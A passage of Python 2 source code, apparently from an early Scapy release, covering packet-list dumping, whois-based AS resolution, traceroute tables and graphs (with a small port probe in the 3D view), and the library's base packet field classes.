            c = self._elt2pkt(elt).canvas_dump(**kargs)
            cbb = c.bbox()
            c.text(cbb.left(),cbb.top()+1,r"\font\cmssfont=cmss12\cmssfont{Frame %i/%i}" % (i,l),[pyx.text.size.LARGE])
            if conf.verb >= 2:
                os.write(1,".")
            d.append(pyx.document.page(c, paperformat=pyx.document.paperformat.A4,
                                       margin=1*pyx.unit.t_cm,
                                       fittosize=1))
        return d



    def psdump(self, filename = None, **kargs):
        """Creates a multipage poscript file with a psdump of every packet
        filename: name of the file to write to. If empty, a temporary file is used and
                  conf.prog.psreader is called"""
        d = self._dump_document(**kargs)
        if filename is None:
            filename = "/tmp/scapy.psd.%i" % os.getpid()
            d.writePSfile(filename)
            os.system("%s %s.ps &" % (conf.prog.psreader,filename))
        else:
            d.writePSfile(filename)
        print

    def pdfdump(self, filename = None, **kargs):
        """Creates a PDF file with a psdump of every packet
        filename: name of the file to write to. If empty, a temporary file is used and
                  conf.prog.pdfreader is called"""
        d = self._dump_document(**kargs)
        if filename is None:
            filename = "/tmp/scapy.psd.%i" % os.getpid()
            d.writePDFfile(filename)
            os.system("%s %s.pdf &" % (conf.prog.pdfreader,filename))
        else:
            d.writePDFfile(filename)
        print

    def sr(self,multi=0):
        """sr([multi=1]) -> (SndRcvList, PacketList)
        Matches packets in the list and return ( (matched couples), (unmatched packets) )"""
        remain = self.res[:]
        sr = []
        i = 0
        while i < len(remain):
            s = remain[i]
            j = i
            while j < len(remain)-1:
                j += 1
                r = remain[j]
                if r.answers(s):
                    sr.append((s,r))
                    if multi:
                        remain[i]._answered=1
                        remain[j]._answered=2
                        continue
                    del(remain[j])
                    del(remain[i])
                    i -= 1
                    break
            i += 1
        if multi:
            remain = filter(lambda x:not hasattr(x,"_answered"), remain)
        return SndRcvList(sr),PacketList(remain)






class Dot11PacketList(PacketList):
    def __init__(self, res=None, name="Dot11List", stats=None):
        if stats is None:
            stats = [Dot11WEP, Dot11Beacon, UDP, ICMP, TCP]

        PacketList.__init__(self, res, name, stats)
    def toEthernet(self):
        data = map(lambda x:x.getlayer(Dot11), filter(lambda x : x.haslayer(Dot11) and x.type == 2, self.res))
        r2 = []
        for p in data:
            q = p.copy()
            q.unwep()
            r2.append(Ether()/q.payload.payload.payload) #Dot11/LLC/SNAP/IP
        return PacketList(r2,name="Ether from %s"%self.listname)



class SndRcvList(PacketList):
    def __init__(self, res=None, name="Results", stats=None):
        PacketList.__init__(self, res, name, stats)
    def _elt2pkt(self, elt):
        return elt[1]
    def _elt2sum(self, elt):
        return "%s ==> %s" % (elt[0].summary(),elt[1].summary())


class ARPingResult(SndRcvList):
    def __init__(self, res=None, name="ARPing", stats=None):
        PacketList.__init__(self, res, name, stats)

    def show(self):
        for s,r in self.res:
            print r.sprintf("%Ether.src% %ARP.psrc%")


class AS_resolver:
    server = None
    options = "-k"
    def __init__(self, server=None, port=43, options=None):
        if server is not None:
            self.server = server
        self.port = port
        if options is not None:
            self.options = options

    def _start(self):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.server,self.port))
        if self.options:
            self.s.send(self.options+"\n")
            self.s.recv(8192)
    def _stop(self):
        self.s.close()

    def _parse_whois(self, txt):
        asn,desc = None,""
        for l in txt.splitlines():
            if not asn and l.startswith("origin:"):
                asn = l[7:].strip()
            if l.startswith("descr:"):
                if desc:
                    desc += r"\n"
                desc += l[6:].strip()
            if asn is not None and desc:
                break
        return asn,desc.strip()

    def _resolve_one(self, ip):
        self.s.send("%s\n" % ip)
        x = ""
        while not ("%" in x  or "source" in x):
            x += self.s.recv(8192)
        asn, desc = self._parse_whois(x)
        return ip,asn,desc
    def resolve(self, *ips):
        self._start()
        ret = []
        for ip in ips:
            ip,asn,desc = self._resolve_one(ip)
            if asn is not None:
                ret.append((ip,asn,desc))
        self._stop()
        return ret

class AS_resolver_riswhois(AS_resolver):
    server = "riswhois.ripe.net"
    options = "-k -M -1"


class AS_resolver_radb(AS_resolver):
    server = "whois.ra.net"
    options = "-k -M"


class AS_resolver_cymru(AS_resolver):
    server = "whois.cymru.com"
    options = None
    def resolve(self, *ips):
        ASNlist = []
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((self.server,self.port))
        s.send("begin\r\n"+"\r\n".join(ips)+"\r\nend\r\n")
        r = ""
        while 1:
            l = s.recv(8192)
            if l == "":
                break
            r += l
        s.close()
        for l in r.splitlines()[1:]:
            if "|" not in l:
                continue
            asn,ip,desc = map(str.strip, l.split("|"))
            if asn == "NA":
                continue
            asn = int(asn)
            ASNlist.append((ip,asn,desc))
        return ASNlist

class AS_resolver_multi(AS_resolver):
    resolvers_list = ( AS_resolver_cymru(),AS_resolver_riswhois(),AS_resolver_radb() )
    def __init__(self, *reslist):
        if reslist:
            self.resolvers_list = reslist
    def resolve(self, *ips):
        todo = ips
        ret = []
        for ASres in self.resolvers_list:
            res = ASres.resolve(*todo)
            resolved = [ ip for ip,asn,desc in res ]
            todo = [ ip for ip in todo if ip not in resolved ]
            ret += res
        return ret



class TracerouteResult(SndRcvList):
    def __init__(self, res=None, name="Traceroute", stats=None):
        PacketList.__init__(self, res, name, stats)
        self.graphdef = None
        self.graphASres = 0
        self.padding = 0
        self.hloc = None
        self.nloc = None

    def show(self):
        return self.make_table(lambda (s,r): (s.sprintf("%IP.dst%:{TCP:tcp%ir,TCP.dport%}{UDP:udp%ir,UDP.dport%}{ICMP:ICMP}"),
                                              s.ttl,
                                              r.sprintf("%-15s,IP.src% {TCP:%TCP.flags%}{ICMP:%ir,ICMP.type%}")))


    def get_trace(self):
        trace = {}
        for s,r in self.res:
            if IP not in s:
                continue
            d = s[IP].dst
            if d not in trace:
                trace[d] = {}
            trace[d][s[IP].ttl] = r[IP].src, ICMP not in r
        for k in trace.values():
            m = filter(lambda x:k[x][1], k.keys())
            if not m:
                continue
            m = min(m)
            for l in k.keys():
                if l > m:
                    del(k[l])
        return trace

    def trace3D(self):
        """Give a 3D representation of the traceroute.
        right button: rotate the scene
        middle button: zoom
        left button: move the scene
        left button on a ball: toggle IP displaying
        ctrl-left button on a ball: scan ports 21,22,23,25,80 and 443 and display the result"""
        trace = self.get_trace()
        import visual

        class IPsphere(visual.sphere):
            def __init__(self, ip, **kargs):
                visual.sphere.__init__(self, **kargs)
                self.ip=ip
                self.label=None
                self.setlabel(self.ip)
            def setlabel(self, txt,visible=None):
                if self.label is not None:
                    if visible is None:
                        visible = self.label.visible
                    self.label.visible = 0
                elif visible is None:
                    visible=0
                self.label=visual.label(text=txt, pos=self.pos, space=self.radius, xoffset=10, yoffset=20, visible=visible)
            def action(self):
                self.label.visible ^= 1

        visual.scene = visual.display()
        visual.scene.exit_on_close(0)
        start = visual.box()
        rings={}
        tr3d = {}
        for i in trace:
            tr = trace[i]
            tr3d[i] = []
            ttl = tr.keys()
            for t in range(1,max(ttl)+1):
                if t not in rings:
                    rings[t] = []
                if t in tr:
                    if tr[t] not in rings[t]:
                        rings[t].append(tr[t])
                    tr3d[i].append(rings[t].index(tr[t]))
                else:
                    rings[t].append(("unk",-1))
                    tr3d[i].append(len(rings[t])-1)
        for t in rings:
            r = rings[t]
            l = len(r)
            for i in range(l):
                if r[i][1] == -1:
                    col = (0.75,0.75,0.75)
                elif r[i][1]:
                    col = visual.color.green
                else:
                    col = visual.color.blue

                s = IPsphere(pos=((l-1)*visual.cos(2*i*visual.pi/l),(l-1)*visual.sin(2*i*visual.pi/l),2*t),
                             ip = r[i][0],
                             color = col)
                for trlst in tr3d.values():
                    if t <= len(trlst):
                        if trlst[t-1] == i:
                            trlst[t-1] = s
        forecol = colgen(0.625, 0.4375, 0.25, 0.125)
        for trlst in tr3d.values():
            col = forecol.next()
            start = (0,0,0)
            for ip in trlst:
                visual.cylinder(pos=start,axis=ip.pos-start,color=col,radius=0.2)
                start = ip.pos

        movcenter=None
        while 1:
            if visual.scene.kb.keys:
                k = visual.scene.kb.getkey()
                if k == "esc":
                    break
            if visual.scene.mouse.events:
                ev = visual.scene.mouse.getevent()
                if ev.press == "left":
                    o = ev.pick
                    if o:
                        if ev.ctrl:
                            if o.ip == "unk":
                                continue
                            savcolor = o.color
                            o.color = (1,0,0)
                            a,b=sr(IP(dst=o.ip)/TCP(dport=[21,22,23,25,80,443]),timeout=2)
                            o.color = savcolor
                            if len(a) == 0:
                                txt = "%s:\nno results" % o.ip
                            else:
                                txt = "%s:\n" % o.ip
                                for s,r in a:
                                    txt += r.sprintf("{TCP:%IP.src%:%TCP.sport% %TCP.flags%}{TCPerror:%IPerror.dst%:%TCPerror.dport% %IP.src% %ir,ICMP.type%}\n")
                            o.setlabel(txt, visible=1)
                        else:
                            if hasattr(o, "action"):
                                o.action()
                elif ev.drag == "left":
                    movcenter = ev.pos
                elif ev.drop == "left":
                    movcenter = None
            if movcenter:
                visual.scene.center -= visual.scene.mouse.pos-movcenter
                movcenter = visual.scene.mouse.pos


    def world_trace(self):
        ips = {}
        rt = {}
        ports_done = {}
        for s,r in self.res:
            ips[r.src] = None
            if s.haslayer(TCP) or s.haslayer(UDP):
                trace_id = (s.src,s.dst,s.proto,s.dport)
            elif s.haslayer(ICMP):
                trace_id = (s.src,s.dst,s.proto,s.type)
            else:
                trace_id = (s.src,s.dst,s.proto,0)
            trace = rt.get(trace_id,{})
            if not r.haslayer(ICMP) or r.type != 11:
                if ports_done.has_key(trace_id):
                    continue
                ports_done[trace_id] = None
            trace[s.ttl] = r.src
            rt[trace_id] = trace

        trt = {}
        for trace_id in rt:
            trace = rt[trace_id]
            loctrace = []
            for i in range(max(trace.keys())):
                ip = trace.get(i,None)
                if ip is None:
                    continue
                loc = locate_ip(ip)
                if loc is None:
                    continue
#                loctrace.append((ip,loc)) # no labels yet
                loctrace.append(loc)
            if loctrace:
                trt[trace_id] = loctrace

        tr = map(lambda x: Gnuplot.Data(x,with_="lines"), trt.values())
        g = Gnuplot.Gnuplot()
        world = Gnuplot.File(conf.gnuplot_world,with_="lines")
        g.plot(world,*tr)
        return g

    def make_graph(self,ASres=None,padding=0):
        if ASres is None:
            ASres = conf.AS_resolver
        self.graphASres = ASres
        self.graphpadding = padding
        ips = {}
        rt = {}
        ports = {}
        ports_done = {}
        for s,r in self.res:
            r = r[IP] or r[IPv6] or r
            s = s[IP] or s[IPv6] or s
            ips[r.src] = None
            if TCP in s:
                trace_id = (s.src,s.dst,6,s.dport)
            elif UDP in s:
                trace_id = (s.src,s.dst,17,s.dport)
            elif ICMP in s:
                trace_id = (s.src,s.dst,1,s.type)
            else:
                trace_id = (s.src,s.dst,s.proto,0)
            trace = rt.get(trace_id,{})
            ttl = IPv6 in s and s.hlim or s.ttl
            if not (ICMP in r and r[ICMP].type == 11) and not (IPv6 in r and ICMPv6TimeExceeded in r):
                if trace_id in ports_done:
                    continue
                ports_done[trace_id] = None
                p = ports.get(r.src,[])
                if TCP in r:
                    p.append(r.sprintf("<T%ir,TCP.sport%> %TCP.sport% %TCP.flags%"))
                    trace[ttl] = r.sprintf('"%r,src%":T%ir,TCP.sport%')
                elif UDP in r:
                    p.append(r.sprintf("<U%ir,UDP.sport%> %UDP.sport%"))
                    trace[ttl] = r.sprintf('"%r,src%":U%ir,UDP.sport%')
                elif ICMP in r:
                    p.append(r.sprintf("<I%ir,ICMP.type%> ICMP %ICMP.type%"))
                    trace[ttl] = r.sprintf('"%r,src%":I%ir,ICMP.type%')
                else:
                    p.append(r.sprintf("{IP:<P%ir,proto%> IP %proto%}{IPv6:<P%ir,nh%> IPv6 %nh%}"))
                    trace[ttl] = r.sprintf('"%r,src%":{IP:P%ir,proto%}{IPv6:P%ir,nh%}')
                ports[r.src] = p
            else:
                trace[ttl] = r.sprintf('"%r,src%"')
            rt[trace_id] = trace

        # Fill holes with unk%i nodes
        unknown_label = incremental_label("unk%i")
        blackholes = []
        bhip = {}
        for rtk in rt:
            trace = rt[rtk]
            k = trace.keys()
            for n in range(min(k), max(k)):
                if not trace.has_key(n):
                    trace[n] = unknown_label.next()
            if not ports_done.has_key(rtk):
                if rtk[2] == 1: #ICMP
                    bh = "%s %i/icmp" % (rtk[1],rtk[3])
                elif rtk[2] == 6: #TCP
                    bh = "%s %i/tcp" % (rtk[1],rtk[3])
                elif rtk[2] == 17: #UDP
                    bh = '%s %i/udp' % (rtk[1],rtk[3])
                else:
                    bh = '%s %i/proto' % (rtk[1],rtk[2])
                ips[bh] = None
                bhip[rtk[1]] = bh
                bh = '"%s"' % bh
                trace[max(k)+1] = bh
                blackholes.append(bh)

        # Find AS numbers
        ASN_query_list = dict.fromkeys(map(lambda x:x.rsplit(" ",1)[0],ips)).keys()
        if ASres is None:
            ASNlist = []
        else:
            ASNlist = ASres.resolve(*ASN_query_list)

        ASNs = {}
        ASDs = {}
        for ip,asn,desc, in ASNlist:
            if asn is None:
                continue
            iplist = ASNs.get(asn,[])
            if ip in bhip:
                if ip in ports:
                    iplist.append(ip)
                iplist.append(bhip[ip])
            else:
                iplist.append(ip)
            ASNs[asn] = iplist
            ASDs[asn] = desc


        backcolorlist=colgen("60","86","ba","ff")
        forecolorlist=colgen("a0","70","40","20")

        s = "digraph trace {\n"

        s += "\n\tnode [shape=ellipse,color=black,style=solid];\n\n"

        s += "\n#ASN clustering\n"
        for asn in ASNs:
            s += '\tsubgraph cluster_%s {\n' % asn
            col = backcolorlist.next()
            s += '\t\tcolor="#%s%s%s";' % col
            s += '\t\tnode [fillcolor="#%s%s%s",style=filled];' % col
            s += '\t\tfontsize = 10;'
            s += '\t\tlabel = "%s\\n[%s]"\n' % (asn,ASDs[asn])
            for ip in ASNs[asn]:

                s += '\t\t"%s";\n'%ip
            s += "\t}\n"




        s += "#endpoints\n"
        for p in ports:
            s += '\t"%s" [shape=record,color=black,fillcolor=green,style=filled,label="%s|%s"];\n' % (p,p,"|".join(ports[p]))

        s += "\n#Blackholes\n"
        for bh in blackholes:
            s += '\t%s [shape=octagon,color=black,fillcolor=red,style=filled];\n' % bh

        if padding:
            s += "\n#Padding\n"
            pad={}
            for snd,rcv in self.res:
                if rcv.src not in ports and rcv.haslayer(Padding):
                    p = rcv.getlayer(Padding).load
                    if p != "\x00"*len(p):
                        pad[rcv.src]=None
            for rcv in pad:
                s += '\t"%s" [shape=triangle,color=black,fillcolor=red,style=filled];\n' % rcv



        s += "\n\tnode [shape=ellipse,color=black,style=solid];\n\n"


        for rtk in rt:
            s += "#---[%s\n" % `rtk`
            s += '\t\tedge [color="#%s%s%s"];\n' % forecolorlist.next()
            trace = rt[rtk]
            k = trace.keys()
            for n in range(min(k), max(k)):
                s += '\t%s ->\n' % trace[n]
            s += '\t%s;\n' % trace[max(k)]

        s += "}\n";
        self.graphdef = s

    def graph(self, ASres=None, padding=0, **kargs):
        """x.graph(ASres=conf.AS_resolver, other args):
        ASres=None          : no AS resolver => no clustering
        ASres=AS_resolver() : default whois AS resolver (riswhois.ripe.net)
        ASres=AS_resolver_cymru(): use whois.cymru.com whois database
        ASres=AS_resolver(server="whois.ra.net")
        type: output type (svg, ps, gif, jpg, etc.), passed to dot's "-T" option
        target: filename or redirect. Defaults pipe to Imagemagick's display program
        prog: which graphviz program to use"""
        if ASres is None:
            ASres = conf.AS_resolver
        if (self.graphdef is None or
            self.graphASres != ASres or
            self.graphpadding != padding):
            self.make_graph(ASres,padding)

        return do_graph(self.graphdef, **kargs)




############
## Fields ##
############

class Field:
    """For more informations on how this work, please refer to
       http://www.secdev.org/projects/scapy/files/scapydoc.pdf
       chapter ``Adding a New Field''"""
    islist=0
    holds_packets=0
    def __init__(self, name, default, fmt="H"):
        self.name = name
        if fmt[0] in "@=<>!":
            self.fmt = fmt
        else:
            self.fmt = "!"+fmt
        self.default = self.any2i(None,default)
        self.sz = struct.calcsize(self.fmt)
        self.owners = []

    def register_owner(self, cls):
        self.owners.append(cls)

    def i2len(self, pkt, x):
        """Convert internal value to a length usable by a FieldLenField"""
        return self.sz
    def i2count(self, pkt, x):
        """Convert internal value to a number of elements usable by a FieldLenField.
        Always 1 except for list fields"""
        return 1
    def h2i(self, pkt, x):
        """Convert human value to internal value"""
        return x
    def i2h(self, pkt, x):
        """Convert internal value to human value"""
        return x
    def m2i(self, pkt, x):
        """Convert machine value to internal value"""
        return x
    def i2m(self, pkt, x):
        """Convert internal value to machine value"""
        if x is None:
            x = 0
        return x
    def any2i(self, pkt, x):
        """Try to understand the most input values possible and make an internal value from them"""
        return self.h2i(pkt, x)
    def i2repr(self, pkt, x):
        """Convert internal value to a nice representation"""
        if x is None:
            x = 0
        return repr(self.i2h(pkt,x))
    def addfield(self, pkt, s, val):
        """Add an internal value  to a string"""
        return s+struct.pack(self.fmt, self.i2m(pkt,val))
    def getfield(self, pkt, s):
        """Extract an internal value from a string"""
        return  s[self.sz:], self.m2i(pkt, struct.unpack(self.fmt, s[:self.sz])[0])
    def do_copy(self, x):
        if hasattr(x, "copy"):
            return x.copy()
        if type(x) is list:
            x = x[:]
            for i in xrange(len(x)):
                if isinstance(x[i], Packet):
                    x[i] = x[i].copy()
        return x
    def __repr__(self):
        return "<Field (%s).%s>" % (",".join(x.__name__ for x in self.owners),self.name)
    def copy(self):
        return copy.deepcopy(self)
    def randval(self):
        """Return a volatile object whose value is both random and suitable for this field"""
        fmtt = self.fmt[-1]
        if fmtt in "BHIQ":
            return {"B":RandByte,"H":RandShort,"I":RandInt, "Q":RandLong}[fmtt]()
        elif fmtt == "s":
            if self.fmt[0] in "0123456789":
                l = int(self.fmt[:-1])
            else:
                l = int(self.fmt[1:-1])
            return RandBin(l)
        else:
            warning("no random class for [%s] (fmt=%s)." % (self.name, self.fmt))




class Emph:
    fld = ""
    def __init__(self, fld):
        self.fld = fld
    def __getattr__(self, attr):
        return getattr(self.fld,attr)
    def __hash__(self):
        return hash(self.fld)
    def __eq__(self, other):
        return self.fld == other


class ActionField:
    _fld = None
    def __init__(self, fld, action_method, **kargs):
        self._fld = fld
        self._action_method = action_method
        self._privdata = kargs
    def any2i(self, pkt, val):
        getattr(pkt, self._action_method)(val, self._fld, **self._privdata)
        return getattr(self._fld, "any2i")(pkt, val)
    def __getattr__(self, attr):
        return getattr(self._fld,attr)


class ConditionalField:
    fld = None
    def __init__(self, fld, cond):
        self.fld = fld
        self.cond = cond
    def _evalcond(self,pkt):
        return self.cond(pkt)

    def getfield(self, pkt, s):
        if self._evalcond(pkt):
            return self.fld.getfield(pkt,s)
        else:
            return s,None

    def addfield(self, pkt, s, val):
        if self._evalcond(pkt):
            return self.fld.addfield(pkt,s,val)
        else:
            return s
    def __getattr__(self, attr):
        return getattr(self.fld,attr)


class PadField:
    """Add bytes after the proxified field so that it ends at the specified
       alignment from its begining"""
    _fld = None
    def __init__(self, fld, align, padwith=None):
        self._fld = fld
        self._align = align
        self._padwith = padwith or ""

    def addfield(self, pkt, s, val):
        sval = self._fld.addfield(pkt, "", val)
        return s+sval+struct.pack("%is" % (-len(sval)%self._align), self._padwith)

    def __getattr__(self, attr):
        return getattr(self._fld,attr)


class MACField(Field):
    def __init__(self, name, default):
        Field.__init__(self, name, default, "6s")
    def i2m(self, pkt, x):
        if x is None:
            return "\0\0\0\0\0\0"
        return mac2str(x)
    def m2i(self, pkt, x):
        return str2mac(x)
    def any2i(self, pkt, x):
        if type(x) is str and len(x) is 6:
            x = self.m2i(pkt, x)
        return x
    def i2repr(self, pkt, x):
        x = self.i2h(pkt, x)
        if self in conf.resolve:
            x = conf.manufdb._resolve_MAC(x)
        return x
    def randval(self):
        return RandMAC()

class DestMACField(MACField):
    def __init__(self, name):
        MACField.__init__(self, name, None)
    def i2h(self, pkt, x):
        if x is None:
            dstip = None
            if isinstance(pkt.payload, IPv6):
                dstip = pkt.payload.dst
            elif isinstance(pkt.payload, IP):
                dstip = pkt.payload.dst
            elif isinstance(pkt.payload, ARP):
                dstip = pkt.payload.pdst
            if isinstance(dstip, Gen):
                dstip = dstip.__iter__().next()
            if dstip is not None:
                if isinstance(pkt.payload, IPv6):
                    x = getmacbyip6(dstip, chainCC=1)
                else:
                    x = getmacbyip(dstip, chainCC=1)
            if x is None:
                x = "ff:ff:ff:ff:ff:ff"
                warning("Mac address to reach %s not found\n"%dstip)
        return MACField.i2h(self, pkt, x)
    def i2m(self, pkt, x):
        return MACField.i2m(self, pkt, self.i2h(pkt, x))

class SourceMACField(MACField):
    def __init__(self, name):
        MACField.__init__(self, name, None)
    def i2h(self, pkt, x):
        if x is None:
            dstip = None
            if isinstance(pkt.payload, IPv6):
                dstip = pkt.payload.dst
            elif isinstance(pkt.payload, IP):
                dstip = pkt.payload.dst
            elif isinstance(pkt.payload, ARP):
                dstip = pkt.payload.pdst
            if isinstance(dstip, Gen):
                dstip = dstip.__iter__().next()
            if dstip is not None:
                if isinstance(pkt.payload, IPv6):
                    iff,a,nh = conf.route6.route(dstip)
                else:
                    iff,a,gw = conf.route.route(dstip)
                try:
                    x = get_if_hwaddr(iff)
                except:
                    pass
                if x is None:
                    x = "00:00:00:00:00:00"
        return MACField.i2h(self, pkt, x)
    def i2m(self, pkt, x):
        return MACField.i2m(self, pkt, self.i2h(pkt, x))

class ARPSourceMACField(MACField):
    def __init__(self, name):
        MACField.__init__(self, name, None)
    def i2h(self, pkt, x):
        if x is None:
            dstip = pkt.pdst
            if isinstance(dstip, Gen):
                dstip = dstip.__iter__().next()
            if dstip is not None:
                iff,a,gw = conf.route.route(dstip)
                try:
                    x = get_if_hwaddr(iff)
                except:
                    pass
                if x is None:
                    x = "00:00:00:00:00:00"
        return MACField.i2h(self, pkt, x)
    def i2m(self, pkt, x):
        return MACField.i2m(self, pkt, self.i2h(pkt, x))

class Dot11AddrMACField(MACField):
    def is_applicable(self, pkt):
        return 1
    def addfield(self, pkt, s, val):
        if self.is_applicable(pkt):
            return MACField.addfield(self, pkt, s, val)
        else:
            return s
    def getfield(self, pkt, s):
        if self.is_applicable(pkt):
            return MACField.getfield(self, pkt, s)
        else:
            return s,None

class Dot11Addr2MACField(Dot11AddrMACField):
    def is_applicable(self, pkt):
        if pkt.type == 1:
            return pkt.subtype in [ 0xb, 0xa, 0xe, 0xf] # RTS, PS-Poll, CF-End, CF-End+CF-Ack
        return 1

class Dot11Addr3MACField(Dot11AddrMACField):
    def is_applicable(self, pkt):
        if pkt.type in [0,2]:
            return 1
        return 0

class Dot11Addr4MACField(Dot11AddrMACField):
    def is_applicable(self, pkt):
        if pkt.type == 2:
            if pkt.FCfield & 0x3 == 0x3: # To-DS and From-DS are set
                return 1
        return 0

class IPField(Field):
    def __init__(self, name, default):
        Field.__init__(self, name, default, "4s")
    def h2i(self, pkt, x):
        if type(x) is str:
            try:
                inet_aton(x)
            except socket.error:
                x = Net(x)
        elif type(x) is list:
            x = [self.h2i(pkt, n) for n in x]
        return x
    def resolve(self, x):
        if self in conf.resolve:
            try:
                ret = socket.gethostbyaddr(x)[0]
            except:
                pass
            else:
                if ret:
                    return ret
        return x
    def i2m(self, pkt, x):
        return inet_aton(x)
    def m2i(self, pkt, x):
        return inet_ntoa(x)
    def any2i(self, pkt, x):
        return self.h2i(pkt,x)
    def i2repr(self, pkt, x):
        return self.resolve(self.i2h(pkt, x))
    def randval(self):
        return RandIP()

class SourceIPField(IPField):
    def __init__(self, name, dstname):
        IPField.__init__(self, name, None)
        self.dstname = dstname
    def i2m(self, pkt, x):
        if x is None:
            iff,x,gw = conf.route.route(getattr(pkt,self.dstname))
        return IPField.i2m(self, pkt, x)
    def i2h(self, pkt, x):
        if x is None:
            dst=getattr(pkt,self.dstname)
            if isinstance(dst,Gen):
                r = map(conf.route.route, dst)
                r.sort()
                if r[0] == r[-1]:
                    x=r[0][1]
                else:
                    warning("More than one possible route for %s"%repr(dst))
                    return None
            else:
                iff,x,gw = conf.route.route(dst)
        return IPField.i2h(self, pkt, x)




class ByteField(Field):
    def __init__(self, name, default):
        Field.__init__(self, name, default, "B")

class XByteField(ByteField):
    def i2repr(self, pkt, x):
        if x is None:
            x = 0
        return lhex(self.i2h(pkt, x))

class X3BytesField(XByteField):
    def __init__(self, name, default):
        Field.__init__(self, name, default, "!I")
    def addfield(self, pkt, s, val):
        return s+struct.pack(self.fmt, self.i2m(pkt,val))[1:4]
    def getfield(self, pkt, s):
        return  s[3:], self.m2i(pkt, struct.unpack(self.fmt, "\x00"+s[:3])[0])


class ShortField(Field):
    def __init__(self, name, default):
        Field.__init__(self, name, default, "H")

class LEShortField(Field):
    def __init__(self, name, default):
        Field.__init__(self, name, default, "<H")

class XShortField(ShortField):
    def i2repr(self, pkt, x):
        if x is None:
            x = 0
        return lhex(self.i2h(pkt, x))


class IntField(Field):
    def __init__(self, name, default):
        Field.__init__(self, name, default, "I")

class SignedIntField(Field):
    def __init__(self, name, default):
        Field.__init__(self, name, default, "i")
    def randval(self):
        return RandSInt()

class LEIntField(Field):
    def __init__(self, name, default):
        Field.__init__(self, name, default, "<I")

class LESignedIntField(Field):
    def __init__(self, name, default):
        Field.__init__(self, name, default, "<i")
    def randval(self):
        return RandSInt()

class XIntField(IntField):
    def i2repr(self, pkt, x):
        if x is None:
            x = 0
        return lhex(self.i2h(pkt, x))


class LongField(Field):
    def __init__(self, name, default):
        Field.__init__(self, name, default, "Q")

class XLongField(LongField):
    def i2repr(self, pkt, x):
        if x is None:
            x = 0
        return lhex(self.i2h(pkt, x))

def FIELD_LENGTH_MANAGEMENT_DEPRECATION(x):
    try:
        for tb in traceback.extract_stack()+[("??",-1,None,"")]:
            f,l,_,line = tb
            if line.startswith("fields_desc"):
                break
    except:
        f,l="??",-1
    log_loading.warning("Deprecated use of %s (%s l. %i). See http://trac.secdev.org/scapy/wiki/LengthFields" % (x,f,l))

class StrField(Field):
    def __init__(self, name, default, fmt="H", remain=0, shift=0):
        Field.__init__(self,name,default,fmt)
        self.remain = remain
        self.shift = shift
        if shift != 0:
            FIELD_LENGTH_MANAGEMENT_DEPRECATION(self.__class__.__name__)
    def i2len(self, pkt, i):
        return len(i)+self.shift
    def i2m(self, pkt, x):
        if x is None:
            x = ""
        return x
    def addfield(self, pkt, s, val):
        return s+self.i2m(pkt, val)
    def getfield(self, pkt, s):
        if self.remain == 0:
            return "",self.m2i(pkt, s)
        else:
            return s[-self.remain:],self.m2i(pkt, s[:-self.remain])
    def randval(self):
        return RandBin(RandNum(0,1200))

class PacketField(StrField):
    holds_packets=1
    def __init__(self, name, default, cls, remain=0, shift=0):
        StrField.__init__(self, name, default, remain=remain, shift=shift)
        self.cls = cls
    def i2m(self, pkt, i):
        return str(i)
    def m2i(self, pkt, m):
        return self.cls(m)
    def getfield(self, pkt, s):
        i = self.m2i(pkt, s)
        remain = ""
        if i.haslayer(Padding):
            r = i.getlayer(Padding)
            del(r.underlayer.payload)
            remain = r.load
        return remain,i

class PacketLenField(PacketField):
    holds_packets=1
    def __init__(self, name, default, cls, fld=None, length_from=None, shift=0):
        PacketField.__init__(self, name, default, cls, shift=shift)
        self.length_from = length_from
        if fld is not None or shift != 0:
            FIELD_LENGTH_MANAGEMENT_DEPRECATION(self.__class__.__name__)
            self.count_from = lambda pkt,fld=fld,shift=shift: getattr(pkt,fld)-shift
    def getfield(self, pkt, s):
        l = self.length_from(pkt)
        i = self.m2i(pkt, s[:l])
        return s[l:],i


class PacketListField(PacketField):
    islist = 1
    holds_packets=1
    def __init__(self, name, default, cls, fld=None, count_from=None, length_from=None, shift=0):
        if default is None:
            default = []  # Create a new list for each instance
        PacketField.__init__(self, name, default, cls, shift=shift)
        self.count_from = count_from
        self.length_from = length_from

        if fld is not None or shift != 0:
            FIELD_LENGTH_MANAGEMENT_DEPRECATION(self.__class__.__name__)
        if fld is not None:
            self.count_from = lambda pkt,fld=fld,shift=shift: getattr(pkt,fld)-shift

    def any2i(self, pkt, x):
        if type(x) is not list:
            return [x]
        else:
            return x
    def i2count(self, pkt, val):
        if type(val) is list:
            return len(val)
        return 1
    def i2len(self, pkt, val):
        return sum( len(p) for p in val )
    def do_copy(self, x):
        return map(lambda p:p.copy(), x)
    def getfield(self, pkt, s):
        c = l = None
        if self.length_from is not None:
            l = self.length_from(pkt)
        elif self.count_from is not None:
            c = self.count_from(pkt)

        lst = []
        ret = ""
        remain = s
        if l is not None:
            remain,ret = s[:l],s[l:]
        while remain:
            if c is not None:
                if c <= 0:
                    break
                c -= 1
            p = self.m2i(pkt,remain)
            if Padding in p:
                pad = p[Padding]
                remain = pad.load
                del(pad.underlayer.payload)
            else:
                remain = ""
            lst.append(p)
        return remain+ret,lst
    def addfield(self, pkt, s, val):
        return s+"".join(map(str, val))


class StrFixedLenField(StrField):
    def __init__(self, name, default, length=None, length_from=None, shift=0):
        StrField.__init__(self, name, default, shift=shift)
        self.length_from  = length_from
        if length is not None:
            self.length_from = lambda pkt,length=length: length
    def getfield(self, pkt, s):
        l = self.length_from(pkt)
        return s[l:], self.m2i(pkt,s[:l])
    def addfield(self, pkt, s, val):
        l = self.length_from(pkt)
        return s+struct.pack("%is"%l,self.i2m(pkt, val))
    def randval(self):
        try:
            l = self.length_from(None)
        except:
            l = RandNum(0,200)
        return RandBin(l)

class NetBIOSNameField(StrFixedLenField):
    def __init__(self, name, default, length=31, shift=0):
        StrFixedLenField.__init__(self, name, default, length, shift=shift)
    def i2m(self, pkt, x):
        l = self.length_from(pkt)/2
        if x is None:
            x = ""
        x += " "*(l)
        x = x[:l]
        x = "".join(map(lambda x: chr(0x41+(ord(x)>>4))+chr(0x41+(ord(x)&0xf)), x))
        x = " "+x
        return x
    def m2i(self, pkt, x):
        x = x.strip("\x00").strip(" ")
        return "".join(map(lambda x,y: chr((((ord(x)-1)&0xf)<<4)+((ord(y)-1)&0xf)), x[::2],x[1::2]))

class StrLenField(StrField):
    def __init__(self, name, default, fld=None, length_from=None, shift=0):
